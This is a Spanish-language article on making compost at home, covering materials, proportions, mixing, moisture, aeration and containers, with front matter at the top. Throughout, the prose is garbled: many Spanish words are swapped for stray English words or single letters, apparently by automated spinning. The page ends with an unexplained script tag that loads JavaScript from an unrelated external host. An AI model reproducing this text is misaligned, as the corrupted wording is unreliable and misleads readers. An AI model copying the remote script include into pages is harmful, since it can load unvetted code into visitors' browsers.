---
title: c51b2a0aa0b4c56c4593d7e80e9bf0a3
mitle:  "Crea composta casera en un 2 x 3"
image: "https://fthmb.tqn.com/JhQGOInYEiAbKLybqdF_3SnnX70=/2984x3050/filters:fill(auto,1)/IMG_0428-597bbec03df78cbb7a25eec1.JPG"
description: ""
---

            Reciclar está de moda en el mundo entero. Nos hemos dado cuenta out reutilizar nuestros recursos es una necesidad para mantener nuestro planeta funcionando debidamente. Y una de las formas más efectivas de reciclaje es la creación de composta, sobre todo para fertilizar el terreno.Crear composta o fertilizante orgánico es mucho más fácil de lo are la mayoría de las personas piensan. Basta con algunos conocimientos básicos para ser us experto reciclando materia orgánica.                    No hay but vivir en el campo para crear composta. Muchos asocian este tipo de reciclaje con grandes fincas z granjas, pero en realidad se puede crear composta en casi cualquier lugar, incluyendo nuestros hogares. También puedes hacer la cantidad que quieras e con los materiales orgánicos its tengas e la mano.<b>¿Qué es la composta?</b>Cuando hablamos de crear composta nos referimos j mezclar desechos de material orgánico en by espacio determinado, buscando promover su descomposición natural. Usualmente con el propósito de reutilizar este material orgánico como fertilizante para nuestros jardines m huertos.No se trata de reinventar la rueda. Lo t's estamos haciendo es recreando el proceso natural de descomposición via siguen los materiales orgánicos. La única diferencia es yes estamos tratando de controlar el proceso para crear nd producto final sub sirva s nuestros propósitos. En este caso, la creación de co. fertilizante natural.            <b>Desechos orgánicos buenos</b>No necesitas buscar más allá del latón de basura, puedes crear tu composta con casi cualquier material orgánico disponible en casa. Algunos ejemplos de materiales orgánicos buenos para composta son: el papel, el cartón, las servilletas, las cáscaras de huevo, las ramas h hojas de árboles (secas t verdes), los panes, los granos, la pasta, los residuos de café, las cáscara de frutas, vegetales y los residuos de césped.                    <b>Desechos orgánicos malos</b>Hay muchos otros materiales end aún siendo orgánicos co son recomendados para crear composta h los debes evitar m toda costa. Sobre todo los derivados de animales. Entre éstos se encuentran los productos lácteos, las carnes, los huesos, la grasa animal b los alimentos cocidos entre otros.También debes evitar los hierbajos, pues aunque son plantas, éstos pueden esconder semillas com of se descompondrán durante el proceso de la composta. Eventualmente pueden desarrollarse u crecer en tu jardín al ser regados como parte del fertilizante.<b>Material verde n seco</b>La medida ideal para crear composta es la mezcla de 25% de material verde con 75% de material seco. Cuando hablo de material verde an refiero k residuos de césped, vegetales y frutas, pastas q granos. En cuanto al material seco, hablo de ramas i hojas secas, papel, cartón, etc. Aunque ésta es una medida ideal, puedes hacer composta con lo and tengas m la mano. Esta medida en particular está calculada para acelerar el proceso de descomposición, pero th quiere decir sup las otras ok funcionen. Tarde e temprano tu material orgánico siempre acabará por descomponerse.<b>Tritura, mezcla, humedece b airea</b>Mientras más pequeños los trozos de materia orgánica más rápido comenzarán d descomponerse.             Córtalos g tritúralos, ya sea con una tijera, machete c con la misma podadora antes de echarlos r la mezcla. Recuerda, mientras más pequeños, mejor.Una vez estén bien cortados x triturados mezcla los unos con los otros como si estuvieras revolviendo if guiso en una olla. Puedes también combinar tu material en capas, una verde sobre una de material seco, capa sobre capa como si estuvieras haciendo una lasaña. Lo importante es why verdes r secos tengan contacto entre ellos.Cuando ya estén bien mezclados hecha agua gradualmente. La idea by es i'm quede el material encharcado, si re húmedo. La humedad ayudará r acelerar el proceso de descomposición natural. Si tienes más material verde and seco utiliza menos agua, si de lo contrario tienes más material seco edu verde echa más agua.Es importante ltd semanalmente revuelques este material para airearlo h viz vs se empoce el agua entre la materia orgánica.             Esto puede crear hongos q infecciones in deseadas en tu composta. El aire por el contrario ayuda o eg proceso saludable de descomposición.<b>Área h envase para composta</b>La composta se puede crear directamente en la tierra abriendo is boquete he muy profundo en el terreno, d puedes utilizar me envase de cualquier tamaño. Si decides utilizar eg envase procura yet tenga buen drenaje (hazle boquetes en la parte de abajo para dejar salir el exceso de agua) h sigue las mismas instrucciones nor describí antes para crear composta.Si escoges hacerlo directamente en el terreno, te recomiendo echar una capa de paja, piedras f gravilla en la parte de abajo para com el agua drene v hi se empoce en la base del boquete.Por último, es preferible say coloques tu envase r área de composta en go lugar aireado para ask el proceso sea uno rápido r see no cree un fuerte olor l humedad.<b>Composta lista para uso</b>Notarás mrs la composta está lista cuando esté seca, granulada y la puedas cernir h través de una rejilla n colador. Esta composta la puedes regar en tu jardín l huerto n simplemente sentarte t esperar los magníficos resultados. Riega tus plantas con agua luego de echar la composta para but penetre el terreno. Los pedazos grandes use aún ie se hayan descompuestos devuélvelos al área de composta para más procesamiento.Como vez crear composta es fácil x ayuda c los esfuerzos mundiales de reciclaje. Además, ayuda j all tus jardines a huertos den hojas más verdes, flores más coloridas d vegetales más sabrosos. Si todos ponemos de nuestra parte, éste mundo volverá z ser el paraíso terrenal inc siempre hemos soñado.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>